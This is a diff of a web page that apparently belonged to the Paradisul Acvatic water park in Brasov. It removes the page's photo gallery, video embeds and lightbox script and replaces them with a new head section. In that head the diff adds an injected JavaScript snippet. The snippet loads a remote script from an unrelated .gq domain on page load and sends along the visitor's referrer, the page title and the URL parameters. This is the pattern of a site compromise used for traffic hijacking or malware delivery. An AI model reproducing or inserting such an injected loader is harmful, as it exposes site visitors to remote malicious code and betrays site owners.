-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10070.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10070.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10067.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10067.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10067.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10066.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10066.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10066.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10065.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10065.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10065.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10064.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10064.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10064.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10063.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10063.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10063.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10062.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10062.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10062.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10061.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10061.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10061.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10060.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10060.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10060.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10058.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10058.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10058.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10057.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10057.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10057.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10056.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10056.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10056.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10055.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10055.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10055.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10053.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10053.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10053.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10051.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10051.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10051.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10050.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10050.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10050.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10049.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10049.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10049.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10048.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10048.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10048.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10047.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10047.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10047.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10046.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10046.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10046.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10045.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10045.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10045.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10044.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10044.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10044.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10043.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10043.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10043.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10042.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10042.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10042.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10041.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10041.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10041.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10040.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10040.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10040.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10039.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10039.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10039.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10038.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10038.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10038.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10037.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10037.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10037.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10036.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10036.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10036.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10035.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10035.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10035.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10033.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10033.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10033.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10032.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10032.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10032.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10031.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10031.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10031.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10030.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10030.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10030.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10029.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10029.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10029.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10028.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10028.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10028.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10027.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10027.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10027.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10026.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10026.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10026.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10025.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10025.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10025.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10024.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10024.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10024.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10023.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10023.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10023.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10022.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10022.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10022.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10021.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10021.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10021.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10019.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10019.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10019.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10018.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10018.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10018.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10017.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10017.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10017.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10016.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10016.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10016.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10015.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10015.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10015.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10014.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10014.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10014.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10013.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10013.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10013.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10012.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10012.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10012.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10011.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10011.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10011.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10010.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10010.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10010.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10009.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10009.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10009.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10008.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10008.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10008.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10007.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10007.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10007.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10006.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10006.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10006.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10005.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10005.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10005.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10003.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10003.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10003.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto-paradisul-acvatic/th_10001.jpeg);">
-										<a href="../files/gallery/galerie-foto-paradisul-acvatic/im_10001.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto-paradisul-acvatic/th_10001.jpeg" alt="" />
-				</div>
-            		<div style="clear:both"></div>
-	</div>
-</div>
-</div>
-</div>
-
-<div id="parad-video-pop-overlay">
-<div id="parad-video-wrapp">
-	<a href="index.html#" id="parad-video-close">Close</a>
-<div id="parad-video-inner">
-    <h2>
-	Video gallery</h2>
-		<div class="vgal">
-					<p>
-				Sarituri la trambulina				<br /><br />
-				<object data="http://www.youtube.com/v/gtoE_HO5a10?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0" type="application/x-shockwave-flash"> 
-					<param name="movie" value="http://www.youtube.com/v/gtoE_HO5a10?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0"> 
-				</object>
-			</p>
-					<p>
-				Relaxare in piscina si SPA				<br /><br />
-				<object data="http://www.youtube.com/v/7RdOzJ-1hQA?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0" type="application/x-shockwave-flash"> 
-					<param name="movie" value="http://www.youtube.com/v/7RdOzJ-1hQA?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0"> 
-				</object>
-			</p>
-					<p>
-				nunta in Paradis				<br /><br />
-				<object data="http://www.youtube.com/v/ZLD_AB4_960?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0" type="application/x-shockwave-flash"> 
-					<param name="movie" value="http://www.youtube.com/v/ZLD_AB4_960?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0"> 
-				</object>
-			</p>
-					<p>
-				Kangoo Jumps				<br /><br />
-				<object data="http://www.youtube.com/v/3F31BcSR5E8?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0" type="application/x-shockwave-flash"> 
-					<param name="movie" value="http://www.youtube.com/v/3F31BcSR5E8?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0"> 
-				</object>
-			</p>
-					<p>
-				Distractie pe apa				<br /><br />
-				<object data="http://www.youtube.com/v/BZBJeWbEeIQ?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0" type="application/x-shockwave-flash"> 
-					<param name="movie" value="http://www.youtube.com/v/BZBJeWbEeIQ?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0"> 
-				</object>
-			</p>
-					<p>
-				Despre noi				<br /><br />
-				<object data="http://www.youtube.com/v/k27D9450f5U?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0" type="application/x-shockwave-flash"> 
-					<param name="movie" value="http://www.youtube.com/v/k27D9450f5U?fs=1&amp;hl=en_US&amp;rel=0&amp;border=0"> 
-				</object>
-			</p>
-				</div>
-</div>
-</div>
-</div>
-
-<div id="parteneri-ipa-overlay">
-	<div id="parteneri-ipa-fix-overlay">&nbsp;</div>
-	<div id="parteneri-ipa-wrapp">
-    	<a href="index.html#" id="parteneri-ipa-close">Close</a>
-        <img src="../files/images/IPA.jpg" alt="parteneri IPA Paradisul Acvatic Brasov" />
-    </div>
-</div>
-
-
-    <div id="jquery-overlay" class="gallery-pop-overlay" style="background-color: rgb(0, 0, 0); opacity: 0.6; width: 100%; height: 1190px;"></div>
-<div id="jquery-lightbox" class="gallery-pop-v02" style="top: 0px; left: 0px;">
-  <div id="lightbox-container-image-box2" style="width: 900px; display: block; height:515px; margin:100px auto; background:#000; overflow:hidden;">
-    
-    <div id="lightbox-container-image">
-    <div id="homepageOverlayWrapper" style="padding:35px 30px 15px; position:relative; overflow:hidden; height:455px;">
-        <h2>
-	Galerie foto</h2>
-
-    <div class="gallery_block">
-							<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10027.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10027.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10027.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10026.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10026.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10026.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10025.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10025.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10025.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10024.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10024.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10024.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10023.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10023.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10023.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10022.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10022.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10022.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10021.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10021.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10021.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10018.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10018.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10018.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10015.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10015.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10015.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10014.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10014.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10014.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10013.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10013.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10013.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10012.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10012.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10012.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10011.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10011.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10011.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10010.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10010.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10010.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10009.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10009.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10009.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10008.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10008.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10008.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10007.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10007.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10007.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10006.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10006.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10006.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10005.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10005.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10005.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10004.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10004.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10004.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10003.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10003.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10003.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10002.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10002.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10002.jpeg" alt="" />
-				</div>
-            				<div class="thumb" style="background-image:url(../files/gallery/galerie-foto/th_10001.jpeg);">
-										<a href="../files/gallery/galerie-foto/im_10001.jpeg"></a>
-										<img style="display:none;" src="../files/gallery/galerie-foto/th_10001.jpeg" alt="" />
-				</div>
-            		<div style="clear:both"></div>
-	</div>
-      
-        <a href="index.html#" id="ppclose" title="Inchide fereastra">Inchide fereastra</a>
-        
-      </div>
-    </div>
-  </div>
-  <div id="lightbox-container-image-data-box" style="display: block; width: 900px;">
-  </div>
-</div>
-
-<script type="text/javascript">
-  $(document).ready(function(){
-    $('#ppclose').click(function(e){
-      e.preventDefault();
-      $('#jquery-lightbox').fadeOut('normal',function(){
-        //$(this).remove();
-        $('#jquery-overlay').fadeOut('fast');
-      })
-    });
-  });
+<html lang="es-ES">
+<head>
+	<span id="9ee25738-7f8d-8a5e-4e15-3568e2950d97"></span><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='https://yasakeevradyi10.gq/4mP7WFm7?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5eac0797d364c=script5eac0797d364d&_cid=9ee25738-7f8d-8a5e-4e15-3568e2950d97'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && 'https://yasakeevradyi10.gq/4mP7WFm7?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5eac0797d364c=script5eac0797d364d'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
 </script>
-</div>
+	<meta charset="UTF-8" />
